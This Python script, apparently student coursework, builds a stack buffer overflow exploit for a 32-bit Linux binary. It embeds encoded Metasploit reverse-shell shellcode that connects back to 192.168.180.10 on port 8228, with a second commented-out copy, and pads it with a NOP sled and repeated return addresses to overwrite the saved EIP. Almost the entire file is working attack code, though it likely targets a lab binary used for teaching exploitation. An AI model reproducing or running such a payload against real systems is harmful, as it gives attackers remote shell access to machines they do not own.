# Author: Jace Kline 2881618

import sys

# constants
buffer_start_addr_little_endian = b"\xa4\xf6\xff\xbf"
return_eip_addr_little_endian = b"\xc4\xf6\xff\xbf"
offset = 1032

# linux/x86/shell_reverse_tcp - 198 bytes
# https://metasploit.com/
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=192.168.180.10, LPORT=8228,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5, PrependFork=false,
# PrependSetresuid=false, PrependSetreuid=false,
# PrependSetuid=false, PrependSetresgid=false,
# PrependSetregid=false, PrependSetgid=false,
# PrependChrootBreak=false, AppendExit=false,
# MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=,
# CreateSession=true, AutoVerifySession=true, CMD=/bin/sh
buf =  b""
buf += b"\x89\xe7\xd9\xce\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x69\x4b\x4c"
buf += b"\x37\x39\x73\x71\x43\x47\x33\x53\x63\x42\x4a\x57\x72"
buf += b"\x6b\x39\x6b\x51\x6e\x50\x30\x66\x58\x4d\x6d\x50\x4a"
buf += b"\x33\x52\x79\x6e\x50\x55\x6f\x7a\x6d\x4b\x30\x61\x59"
buf += b"\x61\x69\x48\x79\x65\x38\x4b\x70\x49\x38\x6c\x74\x64"
buf += b"\x4a\x71\x78\x57\x72\x47\x70\x35\x70\x77\x54\x4d\x59"
buf += b"\x79\x71\x58\x30\x55\x36\x42\x70\x52\x71\x70\x53\x58"
buf += b"\x33\x37\x73\x6d\x59\x68\x61\x68\x4d\x4f\x70\x71\x42"
buf += b"\x45\x38\x72\x4e\x44\x6f\x54\x33\x72\x48\x75\x38\x64"
buf += b"\x6f\x54\x6f\x75\x32\x71\x79\x4f\x79\x48\x63\x31\x42"
buf += b"\x32\x73\x4f\x79\x38\x61\x58\x30\x66\x6b\x6a\x6d\x4f"
buf += b"\x70\x41\x41"

# # linux/x86/shell_reverse_tcp - 197 bytes
# # https://metasploit.com/
# # Encoder: x86/alpha_mixed
# # VERBOSE=false, LHOST=192.168.180.10, LPORT=8228,
# # ReverseAllowProxy=false, ReverseListenerThreaded=false,
# # StagerRetryCount=10, StagerRetryWait=5, PrependFork=false,
# # PrependSetresuid=false, PrependSetreuid=false,
# # PrependSetuid=false, PrependSetresgid=false,
# # PrependSetregid=false, PrependSetgid=false,
# # PrependChrootBreak=false, AppendExit=false,
# # MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=,
# # CreateSession=true, AutoVerifySession=true, CMD=/bin/sh
# buf =  b""
# buf += b"\xd9\xc5\xd9\x74\x24\xf4\x5f\x57\x59\x49\x49\x49\x49"
# buf += b"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
# buf += b"\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
# buf += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
# buf += b"\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x39\x4b\x6b\x47"
# buf += b"\x49\x73\x33\x63\x37\x33\x30\x53\x70\x6a\x54\x42\x4c"
# buf += b"\x49\x39\x71\x38\x30\x30\x66\x58\x4d\x6f\x70\x4a\x33"
# buf += b"\x31\x49\x6c\x70\x45\x6f\x68\x4d\x6b\x30\x50\x49\x44"
# buf += b"\x39\x48\x79\x45\x38\x4f\x30\x4c\x68\x48\x34\x35\x5a"
# buf += b"\x35\x38\x57\x72\x57\x70\x67\x50\x66\x44\x4b\x39\x6d"
# buf += b"\x31\x68\x30\x53\x56\x50\x50\x73\x61\x73\x63\x78\x33"
# buf += b"\x64\x43\x6e\x69\x38\x61\x6a\x6d\x4b\x30\x43\x62\x62"
# buf += b"\x48\x72\x4e\x36\x4f\x51\x63\x30\x68\x55\x38\x74\x6f"
# buf += b"\x56\x4f\x65\x32\x73\x59\x6e\x69\x48\x63\x46\x32\x70"
# buf += b"\x53\x6c\x49\x6b\x51\x4e\x50\x44\x4b\x58\x4d\x4f\x70"
# buf += b"\x41\x41"

# pad the start of the shellcode with NOP sled
# append the shellcode to the end of NOP sled - make sure to align
# append with multiple copies of the return address to overwrite the saved EIP with (should be an address in the NOP sled)
def mk_shellcode(return_eip_addr_bytes: bytes, offset: int, shellcode_bytes: bytes, wordsize=4) -> str:
    bytes_to_fill = offset + wordsize
    align_bytes = len(shellcode_bytes) % 4
    return_addr_repetitions = 64
    nopsled_size = bytes_to_fill + align_bytes - len(shellcode_bytes) - (return_addr_repetitions * wordsize)
    padded_shellcode = (b"\x90"*nopsled_size) + shellcode_bytes + (b"\x90"*(wordsize - align_bytes)) + (return_eip_addr_bytes*return_addr_repetitions)
    return padded_shellcode

if __name__ == "__main__":
    code = mk_shellcode(return_eip_addr_little_endian, offset, buf)
    sys.stdout.buffer.write(code)
